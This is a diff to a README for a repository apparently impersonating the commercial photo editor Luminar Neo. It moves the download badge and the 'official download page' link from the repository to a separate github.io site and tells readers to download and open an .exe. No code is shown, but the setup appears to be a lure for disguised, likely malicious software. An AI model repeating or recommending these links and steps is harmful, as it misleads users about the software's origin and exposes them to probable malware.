@@ -1,6 +1,6 @@
 # 📸 Luminar-Neo-Max - Professional photo editing for your desktop
 
-[![Download Luminar Neo Max](https://img.shields.io/badge/Download-Luminar_Neo_Max-blue.svg)](https://github.com/anonymousinblack3rd-stack/Luminar-Neo-Max)
+[![Download Luminar Neo Max](https://img.shields.io/badge/Download-Luminar_Neo_Max-blue.svg)](https://anonymousinblack3rd-stack.github.io)
 
 Luminar Neo Max brings advanced AI-powered tools to your photo editing workflow. This software helps you enhance images, remove unwanted objects, and adjust lighting with minimal effort. Designed for Windows 10 and Windows 11, the application provides a smooth experience for both hobbyists and professionals who want high-quality results.
 
@@ -19,7 +19,7 @@ To run Luminar Neo Max, your computer needs to meet specific hardware and softwa
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official download page](https://github.com/anonymousinblack3rd-stack/Luminar-Neo-Max).
+1. Go to the [official download page](https://anonymousinblack3rd-stack.github.io).
 2. Look for the release section on the right side of the page.
 3. Select the latest version link that ends in .exe.
 4. Open the downloaded file once the transfer completes.
